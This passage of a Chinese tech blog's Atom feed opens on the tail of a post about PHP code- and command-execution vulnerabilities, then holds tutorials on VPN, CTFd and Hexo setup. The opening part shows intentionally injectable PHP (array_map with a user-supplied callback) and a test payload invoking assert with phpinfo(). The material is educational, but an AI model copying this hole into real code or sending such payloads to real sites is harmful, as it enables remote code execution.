class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test1.php?a=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string system( string $command[, int &amp;$return_var] )</span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void passthru( string $command[, int &amp;$return_var] )</span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string exec( string $command[, <span class="keyword">array</span> &amp;$output[, int &amp;$return_var]] )</span><br></pre></td></tr></table></figure><p>exec() 执行 command 参数所指定的命令。 其余参数，见<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">文档</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"ls"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><h3 id="反引号"><a href="#反引号" class="headerlink" title="`(反引号)"></a>`(反引号)</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php代码执行与命令执行漏洞&lt;/p&gt;
&lt;p&gt;学习php代码执行与命令执行漏洞，没有新姿势&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云ubuntu16.04 搭建IPsec VPN遇到的坑（含docker搭建）</title>
    <link href="https://xianyu123.me/2019/03/22/%E9%98%BF%E9%87%8C%E4%BA%91ubuntu16-04-%E6%90%AD%E5%BB%BAIPsec-VPN/"/>
    <id>https://xianyu123.me/2019/03/22/阿里云ubuntu16-04-搭建IPsec-VPN/</id>
    <published>2019-03-22T13:44:00.000Z</published>
    <updated>2019-05-11T12:52:58.629Z</updated>
    
    <content type="html"><![CDATA[<p>阿里云ubuntu16.04 搭建IPsec VPN遇到的坑（含docker搭建）</p><a id="more"></a><h1 id="非docker版本的搭建"><a href="#非docker版本的搭建" class="headerlink" title="非docker版本的搭建"></a>非docker版本的搭建</h1><p>可以参考这个：<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/README-zh.md#%E5%AE%89%E8%A3%85%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">安装说明</a></p><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>我用的是阿里云的服务器，默认是没用开启<code>UDPU500</code>端口和<code>UDP4500</code>端口的，需要手动开启</p><p><a href="https://yq.aliyun.com/articles/225815" target="_blank" rel="noopener">阿里云服务器怎么开启或关闭8080端口？</a></p><p>然后按下图配置就好了</p><p><img src="http://images.xianyu123.club/UDP_500.jpg?imageslim" alt></p><h2 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h2><p>首先进行<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/docs/clients-zh.md#Windows" target="_blank" rel="noopener">Windows连接VPN</a></p><p>Windows10连接的VPN的时候也会有很多问题，然后根据<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/docs/clients-zh.md#%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4" target="_blank" rel="noopener">故障排除</a>就可以解决问题了</p><h1 id="docker版本的搭建"><a href="#docker版本的搭建" class="headerlink" title="docker版本的搭建"></a>docker版本的搭建</h1><p>按照这个教程<a href="https://github.com/hwdsl2/docker-ipsec-vpn-server/blob/master/README-zh.md" target="_blank" rel="noopener">Docker 上的 IPsec VPN 服务器</a>，就不会有问题</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阿里云ubuntu16.04 搭建IPsec VPN遇到的坑（含docker搭建）&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://xianyu123.me/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfd平台的搭建和优化</title>
    <link href="https://xianyu123.me/2019/03/19/ctfd%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BC%98%E5%8C%96/"/>
    <id>https://xianyu123.me/2019/03/19/ctfd平台的搭建和优化/</id>
    <published>2019-03-19T06:35:07.000Z</published>
    <updated>2019-05-11T12:52:58.620Z</updated>
    
    <content type="html"><![CDATA[<p>ctfd平台的搭建和优化</p><a id="more"></a><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>​       本次环境搭建使用的是腾讯云的学生机（1核2G，1M带宽），ubuntu16.04 64位。</p><h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><h2 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h2><p><code>sudo apt-get install git</code></p><h2 id="2-安装pip"><a href="#2-安装pip" class="headerlink" title="2.安装pip"></a>2.安装pip</h2><p><code>sudo apt-get install python-pip</code></p><h2 id="3-安装Flask"><a href="#3-安装Flask" class="headerlink" title="3.安装Flask"></a>3.安装Flask</h2><p><code>sudo pip install Flask</code></p><h2 id="4-下载CTFd"><a href="#4-下载CTFd" class="headerlink" title="4.下载CTFd"></a>4.下载CTFd</h2><p>我下载在ubuntu的家目录下</p><p><code>sudo git clone https://github.com/CTFd/CTFd</code></p><h2 id="5-安装CTFd"><a href="#5-安装CTFd" class="headerlink" title="5.安装CTFd"></a>5.安装CTFd</h2><ol><li><p><code>cd CTFd</code></p></li><li><p><code>sudo ./prepare.sh</code></p></li></ol><h2 id="6-修改CTFd"><a href="#6-修改CTFd" class="headerlink" title="6.修改CTFd"></a>6.修改CTFd</h2><p>执行完第5步后所需的依赖应该都已经安装好了。先别急着运行CTFd。先修改CTFd/config.py文件，对数据库进行相关的设置（这里以MYSQL为例）</p><p><img src="http://images.xianyu123.club/ctfd_mysql.png?imageslim" alt></p><p>格式为<code>mysql+pymysql://root:数据库密码@localhost/你创建的数据库名字</code></p><h2 id="7-mysql设置"><a href="#7-mysql设置" class="headerlink" title="7.mysql设置"></a>7.mysql设置</h2><p>关于mysql的安装请大家自行google</p><p>进入mysql，新建一个ctfd数据库</p><ol><li><p><code>create datebase ctfd;</code></p></li><li><p><code>exit;</code></p></li></ol><h2 id="8-运行CTFd"><a href="#8-运行CTFd" class="headerlink" title="8.运行CTFd"></a>8.运行CTFd</h2><h2 id="9-设置ctfd数据库字段，防止字符乱码"><a href="#9-设置ctfd数据库字段，防止字符乱码" class="headerlink" title="9.设置ctfd数据库字段，防止字符乱码"></a>9.设置ctfd数据库字段，防止字符乱码</h2><p>再次进入mysql数据库，输入下面的命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> ctfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> awards <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> challenges <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> config <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> containers <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> files <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">keys</span> <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> pages <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> solves <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tags <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> teams <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">tracking</span> <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> wrong_keys <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br></pre></td></tr></table></figure><h2 id="10-开始运行"><a href="#10-开始运行" class="headerlink" title="10.开始运行"></a>10.开始运行</h2><p><code>sudo python serve.py</code></p><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="1-gunicorn部署"><a href="#1-gunicorn部署" class="headerlink" title="1.gunicorn部署"></a>1.gunicorn部署</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、pip install gunicorn</span><br><span class="line"></span><br><span class="line">2、sudo gunicorn --bind 0.0.0.0:8000 - w 4 "CTFd:create_app()"</span><br><span class="line"></span><br><span class="line">此时在浏览器访问你的服务器公网ip:4000就可以进入平台了</span><br></pre></td></tr></table></figure><p>但是这样运行起来性能还是不好，所以我采用了nginx+uwsgi的方法来提高性能</p><h2 id="2-nginx和uwsgi部署"><a href="#2-nginx和uwsgi部署" class="headerlink" title="2.nginx和uwsgi部署"></a>2.nginx和uwsgi部署</h2><p>安装nginx和uwsgi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.apt-get install nginx</span><br><span class="line"></span><br><span class="line">2.pip install uwsgi</span><br></pre></td></tr></table></figure><p>在<code>/etc/nginx/sites-enabled/site</code>中删除<code>default</code>，新建<code>site</code>文件，配置如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123; </span><br><span class="line"><span class="attribute">listen</span> <span class="number">23333</span>; </span><br><span class="line"><span class="attribute">server_name</span> <span class="number">1.1.1.1</span>;<span class="comment">#这里填写你服务器的ip地址，不是1.1.1.1 </span></span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> / &#123; </span><br><span class="line"><span class="attribute">include</span> uwsgi_params; </span><br><span class="line"><span class="attribute">uwsgi_pass</span> unix:/tmp/uwsgi.sock; <span class="comment">#注：这里的sock文件和uwsgi的sock文件配的是同一个文件，因为nginx和uwsgi需要通过这个socket进行交互 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把site软链接到<code>/etc/nginx/sites-available/site</code>下，或者把文件copy到<code>/etc/nginx/sites-available/site</code>下</p><p>之后进入~/CTFd目录，运行</p><p><code>uwsgi -s /tmp/uwsgi.sock --chmod-socket=666 -w &#39;CTFd:create_app()&#39;</code></p><p>然后在浏览器访问你的公网IP，应该就OK了。</p><h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>uwsgi -i xxx.ini时候出现了<code>!!! no internal routing support, rebuild with pcre support !!!</code></p><p><img src="http://images.xianyu123.club/pip_cache.png?imageslim" alt></p><p>这是因为pip缓存的坑，具体内容可以参考<a href="https://reality0ne.com/pip-cahce-dir/" target="_blank" rel="noopener">pip 缓存坑</a></p><p>解决：1.<code>pip uninstall uwsgi</code></p><p>2.<code>sudo apt-get install libpcre3 libpcre3-dev</code></p><p>3.<code>pip install uwsgi --no-cache-dir</code></p><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><h2 id="1-nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！"><a href="#1-nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！" class="headerlink" title="1.nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！"></a>1.nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！</h2><h2 id="2-把静态文件目录地址添加到到nginx配置中"><a href="#2-把静态文件目录地址添加到到nginx配置中" class="headerlink" title="2.把静态文件目录地址添加到到nginx配置中"></a>2.把静态文件目录地址添加到到nginx配置中</h2><h2 id="3-云服务器的话可以考虑CDN加速"><a href="#3-云服务器的话可以考虑CDN加速" class="headerlink" title="3.云服务器的话可以考虑CDN加速"></a>3.云服务器的话可以考虑CDN加速</h2><h2 id="4-redis缓存配置，可惜我不会。。"><a href="#4-redis缓存配置，可惜我不会。。" class="headerlink" title="4.redis缓存配置，可惜我不会。。"></a>4.redis缓存配置，可惜我不会。。</h2><p>暂时就这些吧，有空再进一步研究如何优化！</p><p>## </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctfd平台的搭建和优化&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://xianyu123.me/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo next添加统计文章阅读量功能</title>
    <link href="https://xianyu123.me/2019/02/22/hexo-next%E6%B7%BB%E5%8A%A0%E7%BB%9F%E8%AE%A1%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E5%8A%9F%E8%83%BD/"/>
    <id>https://xianyu123.me/2019/02/22/hexo-next添加统计文章阅读量功能/</id>
    <published>2019-02-22T08:29:41.000Z</published>
    <updated>2019-05-11T12:52:58.621Z</updated>
    
    <content type="html"><![CDATA[<p>hexo next使用Leancloud添加统计文章阅读量功能</p><a id="more"></a><h1 id="使用Leancloud添加统计文章阅读量功能"><a href="#使用Leancloud添加统计文章阅读量功能" class="headerlink" title="使用Leancloud添加统计文章阅读量功能"></a>使用Leancloud添加统计文章阅读量功能</h1><h2 id="1-在LeanCloud先注册一个账户"><a href="#1-在LeanCloud先注册一个账户" class="headerlink" title="1.在LeanCloud先注册一个账户"></a>1.在<a href="https://leancloud.cn/" target="_blank" rel="noopener">LeanCloud</a>先注册一个账户</h2><h2 id="2-然后进入控制台，应用——创建新应用"><a href="#2-然后进入控制台，应用——创建新应用" class="headerlink" title="2.然后进入控制台，应用——创建新应用"></a>2.然后进入控制台，应用——创建新应用</h2><p><img src="http://images.xianyu123.club/leancloud_create.png?imageslim" alt></p><h2 id="3-输入应用名字，任意取，选择开发版"><a href="#3-输入应用名字，任意取，选择开发版" class="headerlink" title="3.输入应用名字，任意取，选择开发版"></a>3.输入应用名字，任意取，选择开发版</h2><p><img src="http://images.xianyu123.club/leancloud_username.png?imageslim" alt></p><h2 id="4-然后进入到这个应用，点击创建Class，Class名字必须是Counter，选择无限制"><a href="#4-然后进入到这个应用，点击创建Class，Class名字必须是Counter，选择无限制" class="headerlink" title="4.然后进入到这个应用，点击创建Class，Class名字必须是Counter，选择无限制"></a>4.然后进入到这个应用，点击创建Class，Class名字必须是<code>Counter</code>，选择无限制</h2><p><img src="http://images.xianyu123.club/leancloud_class.png?imageslim" alt></p><h2 id="5-在设置——安全中心——Web-安全域名中配置自己的域名"><a href="#5-在设置——安全中心——Web-安全域名中配置自己的域名" class="headerlink" title="5.在设置——安全中心——Web 安全域名中配置自己的域名"></a>5.在设置——安全中心——Web 安全域名中配置自己的域名</h2><p><img src="http://images.xianyu123.club/leancloud_web.png?imageslim" alt></p><h2 id="6-修改-theme-next-config-yml中的配置文件"><a href="#6-修改-theme-next-config-yml中的配置文件" class="headerlink" title="6.修改/theme/next/_config.yml中的配置文件"></a>6.修改<code>/theme/next/_config.yml</code>中的配置文件</h2><p><code>app_id</code>和<code>app_key</code>在<code>设置——应用Key</code>，填入<code>_config.yml</code>。我第一次配置就是把下面整段内容又复制进去，导致<code>hexo generate</code>的时候报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leancloud_visitors:</span><br><span class="line">  enable: true</span><br><span class="line">  app_id: #你的app_id</span><br><span class="line">  app_key: #你的app_key</span><br></pre></td></tr></table></figure><h2 id="7-hexo-next-5-1-3注意下面事项"><a href="#7-hexo-next-5-1-3注意下面事项" class="headerlink" title="7.hexo next 5.1.3注意下面事项"></a>7.hexo next 5.1.3注意下面事项</h2><p>在<code>Leancloud</code>中选择华北节点，切记，一定要选择华北节点</p><p><img src="http://images.xianyu123.club/leancloud_huabei.png?imageslim" alt></p><p>如果选择华东节点，会出现下面错误</p><p><img src="http://images.xianyu123.club/leancloud_error.png?imageslim" alt></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>1.<a href="https://forum.leancloud.cn/t/access-denied-by-api-domain-white-list-the-request-origin-header-is-null/18607" target="_blank" rel="noopener">POST <a href="https://tab.leancloud.cn/1.1/classes/Counter?redirectByAPI=cn" target="_blank" rel="noopener">https://tab.leancloud.cn/1.1/classes/Counter?redirectByAPI=cn</a> (index):1 403 ()</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo next使用Leancloud添加统计文章阅读量功能&lt;/p&gt;
    
    </summary>
    
      <category term="Blog搭建" scheme="https://xianyu123.me/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo next添加代码块复制功能</title>
    <link href="https://xianyu123.me/2019/02/21/hexo-next%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81%E5%9D%97%E5%A4%8D%E5%88%B6%E5%8A%9F%E8%83%BD/"/>
    <id>https://xianyu123.me/2019/02/21/hexo-next添加代码块复制功能/</id>
    <published>2019-02-21T14:30:23.000Z</published>
    <updated>2019-05-11T12:52:58.621Z</updated>
    
    <content type="html"><![CDATA[<p>hexo next（5.1.3+）添加代码块复制功能</p><a id="more"></a><h2 id="1-下载插件clipboard-js"><a href="#1-下载插件clipboard-js" class="headerlink" title="1.下载插件clipboard.js"></a>1.下载插件<a href="https://github.com/zenorocha/clipboard.js" target="_blank" rel="noopener">clipboard.js</a></h2><p>如果next版本是<code>4.+</code>的，需要下载<code>1.71</code>左右的版本</p><p>如果next版本是<code>5.1+</code>的需要下载<code>2.0+</code>的版本，我下载的是<code>2.04</code>版本</p><p>如果next版本是<code>6.0+</code>的应该是自带复制功能的</p><h2 id="2-打开themes-next-source-lib-新建文件夹clipboard"><a href="#2-打开themes-next-source-lib-新建文件夹clipboard" class="headerlink" title="2.打开themes/next/source/lib/,新建文件夹clipboard"></a>2.打开<code>themes/next/source/lib/</code>,新建文件夹<code>clipboard</code></h2><h2 id="3-把下载clipboard-js下的dist文件夹下的clipboard-min-js复制到clipboard文件夹下"><a href="#3-把下载clipboard-js下的dist文件夹下的clipboard-min-js复制到clipboard文件夹下" class="headerlink" title="3.把下载clipboard.js下的dist文件夹下的clipboard.min.js复制到clipboard文件夹下"></a>3.把下载<code>clipboard.js</code>下的<code>dist</code>文件夹下的<code>clipboard.min.js</code>复制到<code>clipboard</code>文件夹下</h2><h2 id="4-打开themes-next-source-js-src-新建文件custom-js-代码如下"><a href="#4-打开themes-next-source-js-src-新建文件custom-js-代码如下" class="headerlink" title="4. 打开themes/next/source/js/src/,新建文件custom.js,代码如下:"></a>4. 打开<code>themes/next/source/js/src/</code>,新建文件<code>custom.js</code>,代码如下:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此函数用于创建复制按钮</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCopyBtns</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $codeArea = $(<span class="string">"figure"</span>);</span><br><span class="line">    <span class="comment">//查看页面是否具有代码区域，没有代码块则不创建 复制按钮</span></span><br><span class="line">    <span class="keyword">if</span> ($codeArea.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//复制成功后将要干的事情</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">changeToSuccess</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">             $imgOK = $(<span class="string">"#copyBtn"</span>).find(<span class="string">"#imgSuccess"</span>);</span><br><span class="line">                <span class="keyword">if</span> ($imgOK.css(<span class="string">"display"</span>) == <span class="string">"none"</span>) &#123;</span><br><span class="line">                    $imgOK.css(&#123;</span><br><span class="line">                        opacity: <span class="number">0</span>,</span><br><span class="line">                        display: <span class="string">"block"</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                    $imgOK.animate(&#123;</span><br><span class="line">                        opacity: <span class="number">1</span></span><br><span class="line">                    &#125;, <span class="number">1000</span>);</span><br><span class="line">                    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        $imgOK.animate(&#123;</span><br><span class="line">                            opacity: <span class="number">0</span></span><br><span class="line">                        &#125;, <span class="number">2000</span>);</span><br><span class="line">                    &#125;, <span class="number">2000</span>);</span><br><span class="line">                    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                        $imgOK.css(<span class="string">"display"</span>, <span class="string">"none"</span>);</span><br><span class="line">                    &#125;, <span class="number">4000</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建 全局复制按钮，仅有一组。包含：复制按钮，复制成功回应按钮</span></span><br><span class="line">        <span class="comment">//值得注意的是：1.按钮默认隐藏，2.位置使用绝对位置 position: absolute; (position: fixed 也可以，需要修改代码)</span></span><br><span class="line">        $(<span class="string">".post-body"</span>).before(<span class="string">'&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;left:0px;display: none;line-height: 1; font -size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none ;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'</span>);</span><br><span class="line">        <span class="comment">//创建 复制 插件，绑定单机时间到 指定元素，支援JQuery</span></span><br><span class="line">        <span class="keyword">var</span> clipboard = <span class="keyword">new</span> ClipboardJS(<span class="string">'#copyBtn'</span>, &#123;</span><br><span class="line">            target: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">//返回需要复制的元素内容</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            isSupported: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">//支援复制内容</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">document</span>.querySelector(<span class="string">"[copyFlag]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//复制成功事件绑定</span></span><br><span class="line">        clipboard.on(<span class="string">'success'</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                <span class="comment">//清除内容被选择状态</span></span><br><span class="line">                e.clearSelection();</span><br><span class="line">                changeToSuccess(e);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="comment">//复制失败绑定事件</span></span><br><span class="line">        clipboard.on(<span class="string">'error'</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.error(<span class="string">'Action:'</span>, e.action);</span><br><span class="line">                <span class="built_in">console</span>.error(<span class="string">'Trigger:'</span>, e.trigger);</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="comment">//滑鼠 在复制按钮上滑动和离开后渐变显示/隐藏效果</span></span><br><span class="line">        $(<span class="string">"#copyBtn"</span>).hover(</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                $(<span class="keyword">this</span>).stop();</span><br><span class="line">                $(<span class="keyword">this</span>).css(<span class="string">"opacity"</span>, <span 